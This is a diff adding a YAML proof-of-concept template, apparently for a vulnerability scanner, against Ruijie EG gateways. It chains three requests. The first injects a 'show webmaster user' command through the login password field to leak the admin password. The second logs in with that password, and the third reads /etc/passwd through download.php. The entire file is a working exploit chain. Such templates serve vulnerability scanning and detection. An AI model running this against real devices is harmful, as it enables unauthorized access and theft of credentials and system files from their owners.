@@ -1,0 +1,32 @@
+name: poc-yaml-ruijie-eg-file-read
+rules:
+  - method: POST
+    path: /login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password=admin?show+webmaster+user
+    expression: |
+      response.status == 200 && response.content_type.contains("text/json")
+    search: |
+      {"data":".*admin\s?(?P<password>[^\\"]*)
+  - method: POST
+    path: /login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password={{password}}
+    expression: |
+      response.status == 200 && response.content_type.contains("text/json") && response.headers["Set-Cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
+  - method: POST
+    path: /download.php?a=read_txt
+    follow_redirects: false
+    body: |
+      file=/etc/passwd
+    expression: |
+      response.status == 200 && response.body.bcontains(b"\"status\":true,") && "root:[x*]?:0:0:".bmatches(response.body)
+detail:
+  author: abbin777
+  influence_version: "@2000-2015"
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
